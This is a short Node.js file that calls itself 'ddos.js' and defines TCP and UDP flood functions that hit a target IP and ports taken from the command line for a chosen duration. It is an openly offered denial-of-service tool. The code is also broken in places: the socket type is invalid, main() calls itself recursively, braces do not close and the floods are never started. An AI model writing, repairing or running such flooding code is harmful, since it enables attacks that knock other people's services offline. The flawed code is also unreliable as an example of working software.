const dgram = require('dgram');
const { Worker, isMainThread } = require('worker_threads');

// TCP Flood
function tcpFlood(target, port, duration, userAgents) {
const workerData = { target, port, duration, userAgents };
const worker = new Worker('./tcpFloodWorker.js', { workerData });

worker.on('error', (err) => {
console.error(`TCP Flood worker error: ${err}`);
});

worker.on('exit', (code) => {
console.log(`TCP Flood worker stopped with exit code ${code}`);
});
}

// UDP Flood
function udpFlood(target, port, duration, userAgents) {
const client = dgram.createSocket('udp');
let interval;

client.on('error', (err) => {
console.error(`UDP client error:\n${err.stack}`);
client.close();
});

client.on('message', (msg, rinfo) => {
console.log(`UDP message received from ${rinfo.address}:${rinfo.port}: ${msg}`);
});

client.on('listening', () => {
const address = client.address();
console.log(`UDP client listening on ${address.address}:${address.port}`);
});

client.bind();

interval = setInterval(() => {
const message = Buffer.from(userAgents[Math.floor(Math.random() * userAgents.length)]);
client.send(message, port, target);
}, 100);

setTimeout(() => {
clearInterval(interval);
client.close();
console.log('UDP flood stopped.');
}, duration * 1000);
}

// Main function
function main() {
if (isMainThread) {
const target = process.argv[2]; // target IP address
const duration = parseInt(process.argv[3], 10); // duration in seconds
const tcpPort = parseInt(process.argv[4], 10); // TCP port
const udpPort = parseInt(process.argv[5], 10); // UDP port
const userAgents = [
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
// Add more user agents as needed
];

if (!target || !duration || !tcpPort || !udpPort || isNaN(duration) || isNaN(tcpPort) || isNaN(udpPort)) {
console.log('Usage: node ddos.js <target_IP> <duration_seconds> <tcp_port> <udp_port>');
process.exit(1);
}

main();
